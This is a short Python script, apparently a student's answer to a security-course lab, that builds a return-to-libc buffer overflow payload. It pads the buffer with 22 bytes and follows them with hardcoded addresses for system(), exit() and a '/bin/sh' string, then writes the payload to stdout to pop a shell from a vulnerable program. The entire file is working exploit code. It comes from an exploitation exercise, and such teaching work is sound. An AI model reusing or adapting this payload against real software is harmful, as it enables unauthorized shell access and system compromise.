import sys
from struct import pack
from shellcode import shellcode
#53 bytes for shell
# Implement your attack here!
padding = b"A" * 22
shell = b"/bin/sh"
systemAdd = pack("<I", 0x08051950)
exitAddress = pack("<I", 0x0807a064)
addressOfShellString = pack("<I", 0xfff68e7d)
# Launch the attack! 
payload = padding + systemAdd + exitAddress + addressOfShellString + shell
sys.stdout.buffer.write(payload)
#print(payload)
#overflow + system + exitadd + addressofstring + shellstring
